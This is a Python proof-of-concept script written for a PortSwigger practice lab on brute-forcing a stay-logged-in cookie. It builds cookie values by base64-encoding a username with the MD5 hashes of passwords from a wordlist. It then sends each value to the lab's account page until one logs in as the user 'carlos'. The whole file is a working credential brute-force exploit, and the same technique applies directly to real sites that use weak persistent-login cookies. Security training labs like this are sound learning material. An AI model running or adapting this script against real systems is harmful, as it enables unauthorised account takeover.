# Fully-autonomous proof-of-concept script for Portswigger Lab:                  
# "Brute-forcing a stay-logged-in cookie"                         

import hashlib
import base64
import requests
import tqdm
import sys

ERROR_CODE = 1
EXPECTED_LOGIN_MESSAGE = "Your username is: carlos"


def read_into_list(file):
    list = []

    with open(file) as file_object:
        contents = file_object.readlines()
        for line in contents:
            list.append(line.strip())

    return list


def write_to_file(list, file):
    with open(file, "w") as file_object:
        for entry in list:
            file_object.write(f"{entry}\n")


def animate(text):
    print(text, end="\r")


def generate_bruteforce_wordlist(user, passwords):
    wordlist = []

    for password in passwords:
        password_hash = hashlib.md5(password.encode()).hexdigest()
        cookie = base64.b64encode((f"{user}:{password_hash}").encode()).decode()
        wordlist.append(cookie)

    print(f"[INFO ] Wordlist successfully generated!")
    return wordlist
    

def bruteforce_stay_logged_in_cookie(url, wordlist):
    for cookie in tqdm.tqdm(wordlist):
        cookies = {
            "stay-logged-in": cookie,
        }
        try:
            response = requests.get(url, cookies=cookies)
        except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)
        except KeyboardInterrupt:
            print(f"[INFO ] Quitting due to keyboard interrupt")
            sys.exit(ERROR_CODE)

        if EXPECTED_LOGIN_MESSAGE in response.text:
            print(f"[INFO ] Succesfully bruteforced cookie: \n'{cookie}'")
            return cookie
 

def main():
    url = f"https://0af4005903b1852280e89a7c00bf0069.web-security-academy.net/my-account?id=carlos"
    user = "carlos"
    passwords_file = "passwords.txt"
    passwords = read_into_list(passwords_file)

    print(f"[DEBUG] Generating custom cookie-bruteforcing wordlist ...")
    wordlist = generate_bruteforce_wordlist(user, passwords)

    print()

    print(f"[DEBUG] Bruteforcing stay logged in cookie ...")
    cookie = bruteforce_stay_logged_in_cookie(url, wordlist)


if __name__ == "__main__":
    main()
